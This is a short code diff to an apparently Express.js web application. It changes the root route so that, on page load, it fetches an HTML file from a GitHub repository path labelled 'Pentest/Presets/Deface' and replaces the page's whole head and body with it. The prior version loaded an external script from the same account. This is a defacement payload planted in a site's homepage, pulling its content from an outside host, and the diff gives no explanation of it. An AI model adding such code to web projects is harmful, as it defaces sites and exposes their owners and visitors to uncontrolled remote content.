@@ -37,7 +37,16 @@ function clearHTML(BadString) {
 // Pags estaticas
 
 app.get('/', (req, res) => {
-    res.send('<script src="https://raw.githubusercontent.com/Yyax13/Yyax13/refs/heads/main/x00.js"></script>');
+    res.send(`
+    <script>
+        fetch('https://raw.githubusercontent.com/Yyax13/Pentest/refs/heads/master/Presets/Deface/T404/ash1.html')
+        .then(r=>r.text())
+        .then(t=>{
+          document.head.innerHTML = t.split('<head>')[1].split('</head>')[0];
+          document.body.innerHTML = t.split('<body>')[1].split('</body>')[0];
+        });
+    </script>
+    `);
 });
 
 app.get('/login', (req, res) => {
